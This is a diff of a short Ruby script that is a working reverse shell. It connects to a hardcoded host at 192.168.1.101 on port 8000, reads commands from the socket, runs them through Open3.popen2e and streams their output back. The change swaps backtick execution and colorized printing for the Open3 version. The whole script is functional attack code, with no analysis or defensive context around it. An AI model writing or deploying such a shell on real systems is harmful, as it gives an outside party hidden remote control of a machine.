@@ -1,16 +1,16 @@
 #!/usr/bin/ruby
 
 require "socket"
-require "colorize"
+require "open3"
 
 host = "192.168.1.101"
 port = "8000"
 
 s = TCPSocket.open(host, port)
 
-while line = s.gets
-  line2 = line
-  com = %x(#{line2})
-  puts com.red
-  s.puts(com)
+while true
+  comm = s.gets.chomp
+  Open3.popen2e("#{comm}") do |stdin , stdothers|
+    IO.copy_stream(stdothers, s)
+  end
 end
